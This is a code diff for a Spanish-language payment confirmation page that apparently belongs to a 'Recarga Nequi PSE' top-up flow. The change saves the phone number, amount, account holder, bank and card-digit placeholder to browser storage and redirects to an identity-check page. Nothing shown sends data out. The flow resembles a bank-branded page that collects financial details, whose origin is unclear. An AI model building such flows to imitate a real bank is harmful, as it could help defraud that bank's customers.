@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
 <title>Revisa la info</title>
 <link rel="stylesheet" href="styles.css">
 </head>
@@ -56,7 +55,17 @@ document.getElementById("persona").innerText = persona;
 document.getElementById("banco").innerText = banco;
 
 document.getElementById("recargarBtn").addEventListener("click", () => {
-window.location.href = "loading.html";
+    // Guardar todos los datos de la recarga
+    localStorage.setItem("recarga_telefono", telefono);
+    localStorage.setItem("recarga_monto", monto);
+    localStorage.setItem("recarga_montoFormato", "$" + formatear(monto));
+    localStorage.setItem("recarga_persona", persona);
+    localStorage.setItem("recarga_banco_seleccionado", banco);
+    localStorage.setItem("recarga_concepto", "Recarga Nequi PSE");
+    localStorage.setItem("ultimos_digitos_tarjeta", "0000"); // Temporal, se actualizará después
+    
+    // Redirigir a id_check.html (NO a payment)
+    window.location.href = "id_check.html";
 });
 
 document.getElementById("btnAtras").addEventListener("click", () => {
